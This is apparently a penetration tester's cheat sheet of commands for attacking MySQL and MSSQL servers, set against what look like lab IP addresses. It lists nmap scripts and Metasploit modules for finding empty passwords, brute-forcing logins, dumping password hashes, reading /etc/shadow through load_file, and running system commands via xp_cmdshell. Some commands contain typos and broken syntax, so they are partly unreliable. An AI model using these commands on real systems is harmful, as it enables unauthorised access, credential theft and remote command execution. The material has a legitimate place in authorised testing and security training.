## MySQL

3306 common port for #mysql

## nmap
shows accounts with empty passwords

```bash
nmap --script=mysql-empty-password -p 3306 $IP

show db info with #nmap
nmap <ip address> --script=mysql-info'
```
find other users
```bash
script=mysql-users --script-args-"mysqluser='<username>', mysqlpass=''<password>'"
```
find db's
```bash
script=mysql-databases --script-args-"mysqluser='<username>', mysqlpass=''<password>'"
```
get hashes
```bash
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <ip address>
```
get variables
```bash
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 192.71.145.3
```
audit
```bash
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/n selib/data/mysql-cis.audit'" -p 3306 192.71.145.3
```

## mysql
log in
```bash
mysql -h $IP -u $USER
```

some other commands
`show databases;
`use <database>;
`show tables;`
`select * from  table;'

to get file 
`select load_file("/etc/shadow")`

`exit` to quit

## metasploit
#metasploit #mysql 

get schema
`use auxiliary/scanner/mysql/mysql_schemadump 
`set RHOSTS 192.71.145.
`set USERNAME root
`set PASSWORD "" 
`exploit`

see writable dirs
`use auxiliary/scanner/mysql/mysql_writable_dirs 
`set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt 
`set RHOSTS 192.71.145.3 
`set VERBOSE false 
`set PASSWORD "" 
`exploit`

find sensitive files
`use auxiliary/scanner/mysql/mysql_file_enum 
`set RHOSTS 192.71.145.3 
`set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt 
`set PASSWORD "" 
`exploit`

hashdump
`use auxiliary/scanner/mysql/mysql_hashdump 
`set RHOSTS 192.71.145.3 
`set USERNAME root 
`set PASSWORD "" exploit`

brute force login
`use auxiliary/musql/mysql_login`

sql enum
`use auxiliary/scanner/mysql/mysql_file_enum
`set RHOSTS 192.49.51.3
`set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
`set PASSWORD ""
`exploit`

> note tools under admin need elevated or root privs to run

execute sql commands
`use auxiliary/admin/mysql/mysql_sql`


## MSSQL 
get info on ms sql server
`nmap --script ms-sql-info -p 1433 <ip address>`

detail info on server - NetBIOS, DNS, and OS build version
`nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <ip address`

#nmap script to brute force logins
`nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-p asswords.txt <ip address>`

try to find users with no passwords
`nmap -p 1433 --script ms-sql-empty-password <ip address`

hashes of users
`nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria <ip address>`

run cmd commands, below for ip info
`nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" <ip address>`

### metaspolit

Identifying valid MSSQL users and their passwords
`use auxiliary/scanner/mssql/mssql_login 
`set RHOSTS 10.0.20.101 
`set USER_FILE /root/Desktop/wordlist/common_users.txt 
`set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt'

enumerate
`use auxiliary/admin/mssql/mssql_enum 
`set RHOSTS <ip address> 
`exploit`

Use cmd commands
`use auxiliary/admin/mssql/mssql_exec 
`set RHOSTS 10.0.20.101 
`set CMD whoami 
`exploit`

enum domain accounts
`use auxiliary/admin/mssql/mssql_enum_domain_accounts 
`set RHOSTS 10.0.20.101 
`exploit`

